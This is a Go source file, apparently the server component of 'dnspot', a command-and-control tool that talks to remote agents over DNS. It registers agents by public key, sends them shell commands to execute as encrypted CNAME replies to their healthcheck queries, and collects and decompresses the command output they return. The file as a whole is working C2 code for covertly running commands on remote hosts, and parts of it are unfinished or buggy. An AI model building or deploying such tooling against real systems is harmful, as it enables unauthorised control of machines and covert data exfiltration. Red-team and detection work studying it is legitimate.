package server

import (
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"fmt"
	"io"
	"math"
	"os"
	"strings"
	"time"

	log "github.com/sirupsen/logrus"

	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/conf"
	"github.com/mosajjal/dnspot/cryptography"

	"github.com/spf13/cobra"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

var ServerPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

// 3d buffer for public key and parentpartID. first string is the public key
var outgoingBuffer = make(map[string]map[uint16][]string)
var dedupHashTable = make(map[uint64]bool)

type agentStatusForServer struct {
	LastAckFromAgentServerTime      uint32
	LastAckFromAgentPacketTime      uint32
	NextMessageType                 c2.MsgType
	NextParentPartId                uint16
	HealthCheckIntervalMilliSeconds uint32
}

// first string is the public key
var ConnectedAgents = make(map[string]agentStatusForServer)
var CommandWriter io.Writer

// log received healthcheck. if the agent is due to run a task, the server's response
// to the healthcheck will become different.
func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	log.Infof("Healthcheck, coming from %s", Packet.Signature)
	//register new agent in agent list
	agent, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Infof("Registering new agent in our Connected Agent List, %d agent(s) are connected", len(ConnectedAgents)+1)

		UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(ConnectedAgents)+65), nil)
		ConnectedAgents[Packet.Signature.String()] = agentStatusForServer{
			NextMessageType:                 c2.MessageHealthcheck,
			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
		}
	}
	// agent already exists, only update the timestamps and prepare the next packet based on message type
	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
	ConnectedAgents[Packet.Signature.String()] = agent
	switch agent.NextMessageType {
	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
		payload := []byte("Pong!")
		// check time difference between packet time nad server time. anything after 10 seconds is unacceptable
		// todo: fix this before removing the comment
		if math.Abs(float64(Packet.Msg.TimeStamp-uint32(time.Now().Unix()))) > 10 {
			agent.NextMessageType = c2.MessageSyncTime
			ConnectedAgents[Packet.Signature.String()] = agent
			// change payload to a UTC timestamp just in case the agent works better with payload than server's timestamp
			payload = []byte(time.Now().Format("2006-01-02T15:04:05-0700"))
		}
		//todo: should we pass it on to MessageSyncTimeHandler function here?

		// todo: check the actual next message time here and send a message appropriately
		log.Infof("preparing a response for a healthcheck message")
		msg := c2.MessagePacket{
			TimeStamp:   uint32(time.Now().Unix()),
			MessageType: agent.NextMessageType,
		}
		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
		if err != nil {
			log.Errorf("Error preparing a response for a healthcheck message: %s", err.Error())
			return err
		}

		for _, A := range Answers {
			cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
			if err != nil {
				log.Warnf("Error: %v", err) //todo:fix
			}
			q.Answer = append(q.Answer, cname)
		}
		// this only happens when we're switching mode. after this one, the rest of the requests
		// won't be coming in as healthcheck originally, so won't be hitting this function altogether
	case c2.MessageExecuteCommand:
		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
		// first check to see if this is a residual packet from a previous multi-part convo
		if len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId]) == 0 {
			return nil

		}
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][0])) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

// shows the output of any command run by agent and sent back to us.
func displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey) {
	// probably should save this in a temp file rather than log. //todo
	out := bytes.Trim(fullPayload, "\x00")
	rdata := bytes.NewReader(out)
	r, err := gzip.NewReader(rdata)
	if err == nil {
		out, _ = io.ReadAll(r)
	}
	log.Infof("Command result: %s", out)
	// we only need the result printed in exec mode. in echo mode, this is just a "sent" tickbox
	if conf.GlobalServerConfig.Mode == "exec" {
		fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n------\n", signature.String(), string(out))
	}
}

func HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	_, ok := ConnectedAgents[Packet.Signature.String()]
	if !ok {
		log.Errorf("Agent not recognized")
	}
	// handle multipart incoming
	ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)] = append(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)], Packet)
	// if Packet.Msg.ParentPartID != 0 { // multi part
	//fist and middle packets
	msg := c2.MessagePacket{
		TimeStamp:    uint32(time.Now().Unix()),
		MessageType:  c2.MessageExecuteCommandResponse,
		ParentPartID: Packet.Msg.ParentPartID,
		PartID:       Packet.Msg.PartID,
	}
	payload := []byte("Ack!")
	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
		msg.IsLastPart = true
		agent := ConnectedAgents[Packet.Signature.String()]
		agent.NextMessageType = c2.MessageHealthcheck
		ConnectedAgents[Packet.Signature.String()] = agent
		payload = []byte("Ack! Last Part")
	}
	// log.Infof("sending plyload %#v\n", msg)
	// time.Sleep(2 * time.Second)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
		return nil
	}
	// }

	fullPayload := make([]byte, 0)
	packets := c2.CheckMessageIntegrity(ServerPacketBuffersWithSignature[int(Packet.Msg.ParentPartID)])
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// todo: clean the memory for this parentpartID
	// delete(ServerPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
	displayCommandResult(fullPayload, Packet.Signature)
	// remove the buffer from memory
	delete(ServerPacketBuffersWithSignature, int(Packet.Msg.ParentPartID))
	return nil
}

func MustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
	// As part of the incoming packet, we'll get the partid as well as parentPartId so we know which part to send next. we just need to cache the whole partition up
	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, agentPublicKey)
	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
	//todo: what are we getting from the client? let's decrypt and log those

	if targetBuffer, ok := outgoingBuffer[agentPublicKey.String()][parentPartId]; ok {
		if parentPartId == 0 {
			// if there was a single packet living in the cache before, delete it before proceed
			// todo: maybe this is the place for this but I think it's better to be cleaned up elsewhere
			// delete(outgoingBuffer[agentPublicKey.String()], parentPartId)
			outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
			outgoingBuffer[agentPublicKey.String()][parentPartId] = append(outgoingBuffer[agentPublicKey.String()][parentPartId], Answers[0])
		}
		log.Infof("key and ParentPartId already exist in the buffer, overwriting...")

	} else {
		//initialize the map
		outgoingBuffer[agentPublicKey.String()] = make(map[uint16][]string)
		targetBuffer = append(targetBuffer, Answers...)
		outgoingBuffer[agentPublicKey.String()][parentPartId] = targetBuffer
	}
	log.Infof("command was successfully added to outgoing buffer to be sent")

	// set NextMessageType to let the healthcheck responder know
	agent := ConnectedAgents[agentPublicKey.String()]
	agent.NextMessageType = msgPacket.MessageType
	agent.NextParentPartId = parentPartId
	ConnectedAgents[agentPublicKey.String()] = agent
	// todo: potentially a channel to notify the changes to agent's status and flick it to true when this happens?
	// todo: set interval before returning the packet
	return nil
}

// handle the Server switching an agent's status to run command with a payload, puts the agent's status to run command so we handle it next time the healthcheck arrives
// the input of this function comes directly from TUI input field. it was renamed
// because it'll now consider they message type as a configuration item and
// can provide command execution as well as chat.
func SendMessageToAgent(agentPublicKey *cryptography.PublicKey, command string) error {
	fmt.Fprintf(CommandWriter, "sending message '%s' on %s\n", command, agentPublicKey.String())
	var cmdType c2.CmdType
	if conf.GlobalServerConfig.Mode == "chat" {
		cmdType = c2.CommandEcho
	}
	if conf.GlobalServerConfig.Mode == "exec" {
		cmdType = c2.CommandExec
	}
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageExecuteCommand,
		Command:     cmdType,
	}
	return MustSendMsg(msg, agentPublicKey, command)
}

func MessageChatHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := ConnectedAgents[Packet.Signature.String()]
	acknowledgedId := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
		return nil
	}
	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartId)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1]))
	if err != nil {
		log.Warnf("Error: %v", err) //todo:fix
	}
	// todo: go back to the healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	// log.Infof("sending chat message '%s' to the client", command)
	//msg := c2.MessagePacket{
	//	TimeStamp:   uint32(time.Now().Unix()),
	//	MessageType: c2.MessageChat,
	//}
	//return MustSendMsg(msg, agentPublicKey, c2.MessageChat, command)
	return nil
}

func MessageChatResResHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	// we only get this when the message's last part have been received and parsed.
	// just need to switch back the agent to healthcheck mode
	agent := ConnectedAgents[Packet.Signature.String()]
	agent.NextMessageType = c2.MessageHealthcheck
	ConnectedAgents[Packet.Signature.String()] = agent

	return nil

}

// remove idle agents after 60 seconds
func RemoveIdleAgents() {
	log.Infof("Removing idle agents")
	for k, v := range ConnectedAgents {
		idleTime := time.Now().Unix() - int64(v.LastAckFromAgentServerTime)
		if idleTime > 60 {
			log.Infof("removing agent %s since it has been idle for %d seconds", k, idleTime)
			delete(ConnectedAgents, k)
			for i := range UiAgentList.FindItems(k, "", false, true) {
				UiAgentList.RemoveItem(i)
			}
		}
	}
}

// handle incoming "ack" packets of multipart RunCommand packets from agents
func HandleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
	agent := ConnectedAgents[Packet.Signature.String()]
	acknowledgedId := Packet.Msg.PartID
	// handle last packet ID
	if uint16(len(outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId])) == acknowledgedId {
		return nil
	}
	if Packet.Msg.IsLastPart {
		// reset the agent status to healthcheck and clean the buffer
		agent.NextMessageType = c2.MessageHealthcheck
		delete(outgoingBuffer[Packet.Signature.String()], agent.NextParentPartId)
		return nil
	}
	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, outgoingBuffer[Packet.Signature.String()][agent.NextParentPartId][acknowledgedId+1]))
	if err != nil {
		log.Warnf("Error: %v", err) //todo:fix
	}
	// todo: go back to hne healthcheck handler and send the next packet
	// todo: print output
	q.Answer = append(q.Answer, cname)
	return nil
}

func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg, durationMilliseconds uint32) error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: c2.MessageSetHealthInterval,
	}
	payload := []byte{}
	binary.BigEndian.PutUint32(payload, durationMilliseconds)
	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
	for _, A := range Answers {
		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
		if err != nil {
			log.Warnf("Error: %v", err) //todo:fix
		}
		q.Answer = append(q.Answer, cname)
	}
	return nil
}

func isMsgDuplicate(data []byte) bool {
	// dedup checks
	skipForDudup := false
	hash := c2.FNV1A(data)
	_, ok := dedupHashTable[hash] // check for existence
	if !ok {
		dedupHashTable[hash] = true
	} else {
		skipForDudup = true
	}

	return skipForDudup
}

func parseQuery(m *dns.Msg) error {
	// since the C2 works by A questions at the moment, we cna check dedup by looking at the first question
	// todo: test this
	if isMsgDuplicate([]byte(m.Question[0].Name)) {
		log.Infof("Duplicate message received, discarding")
		return nil
	}
	outs, err := c2.DecryptIncomingPacket(m, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, nil)
	if err != nil {
		log.Infof("Error in Decrypting incoming packet: %v", err)
	}
	for _, o := range outs {
		switch msgType := o.Msg.MessageType; msgType {
		case c2.MessageHealthcheck:
			return MessageHealthcheckHandler(o, m)
		case c2.MessageExecuteCommand:
			return HandleRunCommandAckFromAgent(o, m)
		case c2.MessageExecuteCommandResponse:
			return HandleExecuteCommandResponse(o, m)
		case c2.MessageSetHealthInterval:
			return nil //
		case c2.MessageSyncTime:
			return nil // automatically done as part of routine healthcheck
		}

	}

	// }
	//todo: prepare response
	return nil
}

func handle53(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		err := parseQuery(m)
		if err != nil {
			log.Warnf("bad request: %s", err)
		}
	}
	if err := w.WriteMsg(m); err != nil {
		log.Warnln(err)
	}
}

func runDns(cmd *cobra.Command) {

	dns.HandleFunc(".", handle53)

	// start server
	server := &dns.Server{Addr: conf.GlobalServerConfig.ListenAddress, Net: "udp"}
	log.Infof("Started DNS on %s -- listening", server.Addr)
	err := server.ListenAndServe()
	errorHandler(err)
	if err := server.Shutdown(); err != nil {
		log.Warnln(err)
	}

}

func RunServer(cmd *cobra.Command, args []string) {
	// set global flag that we're running as server
	conf.Mode = conf.RunAsServer
	log.SetLevel(log.Level(conf.GlobalServerConfig.LogLevel))
	if conf.GlobalAgentConfig.LogLevel == uint8(log.DebugLevel) {
		log.SetReportCaller(true)
	}
	if conf.GlobalServerConfig.LogFile != "" {
		f, err := os.OpenFile(conf.GlobalServerConfig.LogFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Fatalf("error opening file: %v", err)
		}
		mw := io.MultiWriter(UiLog, f)
		log.SetOutput(mw)
	} else {
		log.SetOutput(UiLog)
	}

	if conf.GlobalServerConfig.OutFile != "" {
		f, err := os.OpenFile(conf.GlobalServerConfig.OutFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Fatalf("error opening file: %v", err)
		}
		CommandWriter = io.MultiWriter(UiLog, f)
	} else {
		CommandWriter = UiLog
	}

	var err error
	conf.GlobalServerConfig.ListenAddress, err = cmd.Flags().GetString("listenAddress")
	errorHandler(err)

	conf.GlobalServerConfig.PrivateKeyBasexx, err = cmd.Flags().GetString("privateKey")
	errorHandler(err)
	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyBasexx)
	errorHandler(err)

	log.Infof("Use the following public key to connect clients: %s", conf.GlobalServerConfig.PrivateKey.GetPublicKey().String())

	// todo: public keys

	dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
	errorHandler(err)
	if !strings.HasSuffix(dnsSuffix, ".") {
		dnsSuffix = dnsSuffix + "."
	}
	if !strings.HasPrefix(dnsSuffix, ".") {
		dnsSuffix = "." + dnsSuffix
	}
	conf.GlobalServerConfig.DnsSuffix = dnsSuffix

	go runDns(cmd)
	RunTui()

}
